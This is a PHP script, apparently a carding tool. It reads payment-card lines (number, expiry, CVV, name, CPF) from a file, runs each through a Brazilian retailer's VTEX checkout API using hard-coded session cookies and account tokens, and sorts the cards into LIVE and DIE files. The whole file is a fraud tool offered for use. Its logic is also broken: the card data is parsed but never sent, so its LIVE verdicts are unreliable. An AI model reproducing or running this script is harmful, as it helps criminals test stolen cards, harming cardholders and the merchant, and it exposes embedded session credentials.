<?php
// api_checkout_batch.php - Processa lote de cartões

ini_set('display_errors', 0);
error_reporting(0);
set_time_limit(0); // Sem limite de tempo para processar muitos cartões

// Configurações
define('BASE_URL', 'https://www.rissul.com.br');
define('CARDS_FILE', 'cards.txt');
define('LIVE_FILE', 'cards_live.txt');
define('DIE_FILE', 'cards_die.txt');
define('PROCESSED_FILE', 'cards_processed.txt');
define('LOG_FILE', 'checkout_log.txt');

// Cookie COMPLETO
$cookieString = 'VtexWorkspace=master%-; vtex-search-session=89a4cf52604542058e13d96bb482f4e4; vtex-search-anonymous=3ec05a227a8741a9b5a2d367ec9e23f9; _ga=GA1.1.754346257.1778667680; dinTrafficSource=eyJ1cmwiOiJodHRwczovL3d3dy5yaXNzdWwuY29tLmJyLz9zcnNsdGlkPUFmbUJPb3JMeTB0RnlNRUVJRW1xSG5rU2U0MG5yMDA3Z2pKSFJuUWk2Z1c4aGNVZFFwTnNaVzJKIiwicmVmZXJlciI6Imh0dHBzOi8vd3d3Lmdvb2dsZS5jb20vIn0=; init-modal-region=true; dinLeadTrack=eyJyZWZlcnJlciI6Ind3dy5nb29nbGUuY29tIiwicmVmZXJyZXJfcG9zdGVkIjp0cnVlLCJ1c2VyX2luZm9fdHlwZSI6IkVNIiwidXNlcl9pbmZvIjoiU05BRWNoX3dSenhuZTFBeHcwdGFxTkNqWTZtZHFNdmdYMzNKZkY1X1NoZEt0bDVOUlNGX2Vram5ISTZvUmd2OFdUZ1d3dFRQMHRPaDdleFYxd09GeGpDUEF1aFU1bGszay1vV0F5SzctUE1DbVkwQnpUTXpuTjNCblV4eUZoakI1RWV0SDI0YkM4RTRNRlZpZVV0eWRtaGE2bmlxaS1OdzBUXy1EMHNYRDBGZHFsRkJqblAwcmhCa0gtNElJSGFRbUx2cXdhVVR1bzA1elVPVEhFclZZVkFhZDhtUE5ZRFd2eTZIanRHZ3VnM3FJVVB6dlMxTmRhZnRUZENmdElmNDRSS3Q3STRPeFpvV25MOHhvQ202Wl9aVktMdUgwdHU1dFIzWkZERDFnQVhnalFVMjF1aHIwLVhJTkV1UHNqc2ZTS3Rrc0pLVU1PNjl6Zl82V0RpY1hRPT0ifQ==; VtexIdclientAutCookie_superrissul=eyJhbGciOiJFUzI1NiIsImtpZCI6IkQyQUQxN0Y3N0Y3RDE4RjE3NzQ1MUJEMDRGMDY0NDQwNzlDNzY3RTIiLCJ0eXAiOiJqd3QifQ.eyJzdWIiOiJkZWx1eG9zdG9yZTE5QGdtYWlsLmNvbSIsImFjY291bnQiOiJzdXBlcnJpc3N1bCIsImF1ZGllbmNlIjoid2Vic3RvcmUiLCJzZXNzIjoiMzRlN2Q3MTUtZTQ0Yi00YWQxLWJmMWYtYTc2ZDQ4ODkzMjQ3IiwiZXhwIjoxNzc4NzU0MjAyLCJ0eXBlIjoidXNlciIsInVzZXJJZCI6ImZlMWY3N2E4LThhNDgtNGUwOC04MzkxLWE3YTNiNTZhMWEwNyIsImlhdCI6MTc3ODY2NzgwMiwiaXNSZXByZXNlbnRhdGl2ZSI6ZmFsc2UsImlzcyI6InRva2VuLWVtaXR0ZXIiLCJqdGkiOiIwYTU5MDY5ZC01OGM3LTQyMWItOTM4NC02NGIwMDQxMTFkY2MifQ.kicQmQN6IP1DuzE85EB0T_-siCqrWbEJqOze_TD7hcFp8Cbw3PIOd5oXUBquqQzVndldgrTbPA60Ix-SxVMckw; VtexIdclientAutCookie_af3df700-2d73-4dee-a5f9-d31714e22c25=eyJhbGciOiJFUzI1NiIsImtpZCI6IkQyQUQxN0Y3N0Y3RDE4RjE3NzQ1MUJEMDRGMDY0NDQwNzlDNzY3RTIiLCJ0eXAiOiJqd3QifQ.eyJzdWIiOiJkZWx1eG9zdG9yZTE5QGdtYWlsLmNvbSIsImFjY291bnQiOiJzdXBlcnJpc3N1bCIsImF1ZGllbmNlIjoid2Vic3RvcmUiLCJzZXNzIjoiMzRlN2Q3MTUtZTQ0Yi00YWQxLWJmMWYtYTc2ZDQ4ODkzMjQ3IiwiZXhwIjoxNzc4NzU0MjAyLCJ0eXBlIjoidXNlciIsInVzZXJJZCI6ImZlMWY3N2E4LThhNDgtNGUwOC04MzkxLWE3YTNiNTZhMWEwNyIsImlhdCI6MTc3ODY2NzgwMiwiaXNSZXByZXNlbnRhdGl2ZSI6ZmFsc2UsImlzcyI6InRva2VuLWVtaXR0ZXIiLCJqdGkiOiIwYTU5MDY5ZC01OGM3LTQyMWItOTM4NC02NGIwMDQxMTFkY2MifQ.kicQmQN6IP1DuzE85EB0T_-siCqrWbEJqOze_TD7hcFp8Cbw3PIOd5oXUBquqQzVndldgrTbPA60Ix-SxVMckw; vtex_segment=eyJjYW1wYWlnbnMiOm51bGwsImNoYW5uZWwiOiIxIiwicHJpY2VUYWJsZXMiOm51bGwsInJlZ2lvbklkIjoiVTFjamNtbHpjM1ZzWTJGdVpXeGhNamM9IiwidXRtX2NhbXBhaWduIjpudWxsLCJ1dG1fc291cmNlIjpudWxsLCJ1dG1pX2NhbXBhaWduIjpudWxsLCJjdXJyZW5jeUNvZGUiOiJCUkwiLCJjdXJyZW5jeVN5bWJvbCI6IlIkIiwiY291bnRyeUNvZGUiOiJCUkEiLCJjdWx0dXJlSW5mbyI6InB0LUJSIiwiYWRtaW5fY3VsdHVyZUluZm8iOiJwdC1CUiIsImNoYW5uZWxQcml2YWN5IjoicHVibGljIn0; _dAutomationGtmSessionCookie=1778667788506.sbfie9eperf78akdtj99r3; i18next=pt-BR; lastVisitModalDisponibility=true; ISS=InternalCampaign=UTMI_CP; _gcl_au=1.1.1016878356.1778667680.286847170.1778667692.1778669960; checkout.vtex.com=__ofid=060b8fa6def14068b86ab1419dbfbdc9; vtex_session=eyJhbGciOiJFUzI1NiIsImtpZCI6IjhhOWFkNTBiLTIzMzctNDk1ZC1hZTU4LTM4NTQ2ODMzMjg0NiIsInR5cCI6IkpXVCJ9.eyJhY2NvdW50LmlkIjpbXSwiaWQiOiI0NzU4MWFiYS05MjQwLTQwMGQtOThiYy1mOTRkZGIwYzQ4MGIiLCJ2ZXJzaW9uIjoxMSwic3ViIjoic2Vzc2lvbiIsImFjY291bnQiOiJzdXBlcnJpc3N1bCIsImV4cCI6MTc3OTEwMTQ3MywiaWF0IjoxNzc4NjY5NDczLCJqdGkiOiJkMmMzNGM5NS01NGU3LTQzZjYtODVmOS1lNGUxOTc4YTEwODIiLCJpc3MiOiJzZXNzaW9uL2RhdGEtc2lnbmVyIn0.pHSxZx-H6V1MVoj90LX1yg5oP3z9LPzVZqlk5w2gxieIndqb7FG-mGLvRSywmIip86U3PWp6gNcrsK-8sHYPYQ; _ga_BSFWN6T13G=GS2.1.s1778667679$o1$g1$t1778669996$j11$l0$h1762690106; CheckoutOrderFormOwnership=XoClClkTF%2Fnkgiuc5oylngpP511c2SJdUO%2BMlRZRAqrvQI2NIu37yOwPs2Ibora8Dw58Lsebhwk4bNup7AARi3UqYsWW4OoKfMp9TRkhWT1MSZewn6bYIh555UUjGYasjNtaBBXvdpp3qIQbZMZR3qC6PtVFliHbCGjpJs880WKvvDs6%2B2gflxGsbg1Z9u%2Ba78cfsBPlO4rZgsiEsaFwD6uFT3rV6BnmsCpwmRl1DQtFaV1t%2BFArhbt%2Bpu2QdVo%2BBsgO%2F6q7parvLo2ye7HRT4NaXcFJOQjA%2BFwvqcXimmfaDdmydWF1AbqkUcQKcB0WErB3WvjkIJHzXo18MjCpRpKR%2B2L4uSo%2BrQ1nUp%2FpTWU2%2F4upcsLD%2BfyEK%2FdFJ1MoSyM1o1%2Ftd3P3lFi64MShguTrSOUHeelPS69lb2ZKn1meWrs9JAsID9%2FZ27Rsj6ETxg28J9fD0JWUZmVvZQonu9o1PtJujl9qMyCkEMhl8nXy6XCPHeb%2B1JBBBRBK9wDRWzd4Eq4vuPOXUu8yJ13ezYNz2B4bDpFJMqv13XNHULJuqj%2BtdA169%2FZpmnLFonsKAyOYT1K7JXOkSmvOL1D4A6oYbYlryXfRwnyVgwup2tXqO9edB%2BqMKG0k8V2uie7P';

// Função para fazer requisições
function makeRequest($url, $method = 'GET', $data = null, $extraHeaders = []) {
    $ch = curl_init();
    
    $defaultHeaders = [
        'Host: www.rissul.com.br',
        'sec-ch-ua-platform: "Windows"',
        'user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36 OPR/130.0.0.0',
        'accept: application/json, text/javascript, */*; q=0.01',
        'content-type: application/json; charset=UTF-8',
        'sec-ch-ua-mobile: ?0',
        'origin: https://www.rissul.com.br',
        'sec-fetch-site: same-origin',
        'sec-fetch-mode: cors',
        'sec-fetch-dest: empty',
        'accept-language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
        'Cookie: ' . $GLOBALS['cookieString']
    ];
    
    $headers = array_merge($defaultHeaders, $extraHeaders);
    
    $options = [
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_HEADER => true,
        CURLOPT_TIMEOUT => 30,
        CURLOPT_HTTPHEADER => $headers,
        CURLOPT_FOLLOWLOCATION => false
    ];
    
    if ($method === 'POST') {
        $options[CURLOPT_POST] = true;
        if ($data) {
            $options[CURLOPT_POSTFIELDS] = is_array($data) ? json_encode($data) : $data;
        }
    }
    
    curl_setopt_array($ch, $options);
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $headerSize = curl_getinfo($ch, CURLINFO_HEADER_SIZE);
    $headersResp = substr($response, 0, $headerSize);
    $body = substr($response, $headerSize);
    $curlError = curl_error($ch);
    
    curl_close($ch);
    
    return [
        'status_code' => $httpCode,
        'headers' => $headersResp,
        'body' => $body,
        'error' => $curlError
    ];
}

// Função para processar um único cartão
function processSingleCard($cardData) {
    try {
        $parts = explode('|', trim($cardData));
        if (count($parts) < 4) {
            return ['status' => 'DIE', 'reason' => 'Formato inválido', 'http_code' => 400];
        }
        
        // Gerar IDs
        $orderFormId = '060b8fa6def14068b86ab1419dbfbdc9'; // Fallback fixo
        $callbackId = time() . rand(1000, 9999);
        
        // ========= PASSO 1: GraphQL addToCart =========
        $graphqlHeaders = [
            'x-requested-with: XMLHttpRequest',
            'accept: */*',
            'content-type: application/json',
            'referer: https://www.rissul.com.br/'
        ];
        
        $variables = base64_encode('{"items":[{"id":8679,"index":0,"quantity":1,"seller":"1","options":[]}]}');
        
        $graphqlData = [
            'operationName' => 'addToCart',
            'variables' => new stdClass(),
            'extensions' => [
                'persistedQuery' => [
                    'version' => 1,
                    'sha256Hash' => 'a63161354718146c4282079551df81aaa8fa3d59584520cf5ea1c278fac0db33',
                    'sender' => 'vtex.checkout-resources@0.x',
                    'provider' => 'vtex.checkout-graphql@0.x'
                ],
                'variables' => $variables
            ]
        ];
        
        $graphqlResponse = makeRequest(
            BASE_URL . '/_v/private/graphql/v1?workspace=master&maxAge=long&appsEtag=remove&domain=store&locale=pt-BR',
            'POST',
            $graphqlData,
            $graphqlHeaders
        );
        
        // ========= PASSO 2: PaymentData =========
        $paymentHeaders = [
            'x-requested-with: XMLHttpRequest',
            'accept: application/json, text/javascript, */*; q=0.01',
            'referer: https://www.rissul.com.br/checkout/'
        ];
        
        $paymentData = [
            'payments' => [
                [
                    'paymentSystem' => '4',
                    'referenceValue' => 376,
                    'value' => 376,
                    'installments' => 1,
                    'installmentsInterestRate' => 0,
                    'hasDefaultBillingAddress' => true
                ]
            ],
            'giftCards' => [],
            'expectedOrderFormSections' => [
                'items', 'totalizers', 'clientProfileData', 'shippingData',
                'paymentData', 'sellers', 'messages', 'marketingData',
                'clientPreferencesData', 'storePreferencesData', 'giftRegistryData',
                'ratesAndBenefitsData', 'openTextField', 'commercialConditionData', 'customData'
            ]
        ];
        
        $paymentResponse = makeRequest(
            BASE_URL . "/api/checkout/pub/orderForm/{$orderFormId}/attachments/paymentData",
            'POST',
            $paymentData,
            $paymentHeaders
        );
        
        // ========= PASSO 3: Callback =========
        $callbackUrl = BASE_URL . "/api/checkout/pub/gatewayCallback/{$callbackId}";
        $callbackHeaders = ['accept: */*', 'content-type: application/json'];
        $callbackResponse = makeRequest($callbackUrl, 'POST', null, $callbackHeaders);
        
        $statusCode = $callbackResponse['status_code'];
        $live = in_array($statusCode, [200, 201, 204]);
        
        return [
            'status' => $live ? 'LIVE' : 'DIE',
            'http_code' => $statusCode,
            'callback_id' => $callbackId,
            'payment_id' => $callbackId
        ];
        
    } catch (Exception $e) {
        return ['status' => 'DIE', 'reason' => $e->getMessage(), 'http_code' => 500];
    }
}

// Função para escrever log
function writeLog($message) {
    $timestamp = date('Y-m-d H:i:s');
    file_put_contents(LOG_FILE, "[$timestamp] $message\n", FILE_APPEND);
}

// ========= PROCESSAMENTO PRINCIPAL =========
header('Content-Type: application/json');

// Verificar se arquivo cards.txt existe
if (!file_exists(CARDS_FILE)) {
    echo json_encode([
        'success' => false,
        'error' => "Arquivo 'cards.txt' não encontrado",
        'instruction' => "Crie um arquivo cards.txt com um cartão por linha no formato: NUMERO|MES|ANO|CVV|NOME|CPF"
    ], JSON_PRETTY_PRINT);
    exit;
}

// Ler cartões do arquivo
$cards = file(CARDS_FILE, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
$totalCards = count($cards);

if ($totalCards === 0) {
    echo json_encode(['success' => false, 'error' => 'Nenhum cartão encontrado em cards.txt'], JSON_PRETTY_PRINT);
    exit;
}

// Limpar arquivos anteriores
file_put_contents(LIVE_FILE, '');
file_put_contents(DIE_FILE, '');
file_put_contents(PROCESSED_FILE, '');

writeLog("Iniciando processamento de $totalCards cartões");

$liveCount = 0;
$dieCount = 0;
$results = [];

echo "\n========================================\n";
echo "PROCESSANDO " . $totalCards . " CARTÕES\n";
echo "========================================\n\n";

// Processar cada cartão
foreach ($cards as $index => $card) {
    $cardNumber = explode('|', $card)[0] ?? 'Desconhecido';
    echo "[ " . ($index + 1) . "/$totalCards ] Processando: " . substr($cardNumber, 0, 6) . "******" . substr($cardNumber, -4) . "... ";
    
    $result = processSingleCard($card);
    
    if ($result['status'] === 'LIVE') {
        file_put_contents(LIVE_FILE, $card . "\n", FILE_APPEND);
        file_put_contents(PROCESSED_FILE, $card . " | LIVE | HTTP " . $result['http_code'] . " | Payment ID: " . ($result['payment_id'] ?? 'N/A') . "\n", FILE_APPEND);
        $liveCount++;
        echo "✅ LIVE (HTTP {$result['http_code']})\n";
        writeLog("LIVE - Card: " . substr($cardNumber, 0, 6) . "**** - Payment ID: " . ($result['payment_id'] ?? 'N/A'));
    } else {
        file_put_contents(DIE_FILE, $card . "\n", FILE_APPEND);
        file_put_contents(PROCESSED_FILE, $card . " | DIE | HTTP " . ($result['http_code'] ?? '000') . " | " . ($result['reason'] ?? 'Falhou') . "\n", FILE_APPEND);
        $dieCount++;
        echo "❌ DIE (HTTP {$result['http_code']})\n";
        writeLog("DIE - Card: " . substr($cardNumber, 0, 6) . "**** - Reason: " . ($result['reason'] ?? 'Unknown'));
    }
    
    $results[] = [
        'card' => substr($cardNumber, 0, 6) . '****' . substr($cardNumber, -4),
        'status' => $result['status'],
        'http_code' => $result['http_code'] ?? null,
        'payment_id' => $result['payment_id'] ?? null
    ];
    
    // Delay para não sobrecarregar o servidor
    usleep(500000); // 0.5 segundos
}

// Resumo final
$summary = [
    'success' => true,
    'total_processed' => $totalCards,
    'live_count' => $liveCount,
    'die_count' => $dieCount,
    'live_file' => LIVE_FILE,
    'die_file' => DIE_FILE,
    'processed_file' => PROCESSED_FILE,
    'log_file' => LOG_FILE,
    'results' => $results
];

writeLog("Processamento finalizado - LIVE: $liveCount | DIE: $dieCount");

echo "\n========================================\n";
echo "RESUMO FINAL\n";
echo "========================================\n";
echo "✅ LIVE: $liveCount cartões\n";
echo "❌ DIE: $dieCount cartões\n";
echo "📁 LIVE salvos em: " . LIVE_FILE . "\n";
echo "📁 DIE salvos em: " . DIE_FILE . "\n";
echo "📁 Processados salvos em: " . PROCESSED_FILE . "\n";
echo "📝 Log salvo em: " . LOG_FILE . "\n";
echo "========================================\n";

echo json_encode($summary, JSON_PRETTY_PRINT);
?>